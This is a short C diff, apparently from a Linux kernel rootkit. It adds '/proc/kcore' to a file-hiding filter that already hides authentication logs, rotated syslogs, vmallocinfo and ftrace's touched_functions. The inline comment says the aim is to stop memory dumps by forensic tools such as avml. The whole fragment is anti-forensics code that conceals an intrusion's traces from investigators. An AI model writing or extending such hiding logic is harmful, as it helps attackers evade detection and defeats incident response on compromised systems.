@@ -41,6 +41,7 @@ notrace static bool should_filter_file(const char *filename) {
             strcmp(filename, "auth.log.1") == 0 ||
             strcmp(filename, "vmallocinfo") == 0 ||
             strcmp(filename, "syslog.1") == 0 ||
+            strcmp(filename, "kcore") == 0 || //temp fix to avoid memory dump using tools like avml
             strcmp(filename, "touched_functions") == 0);
 }
 
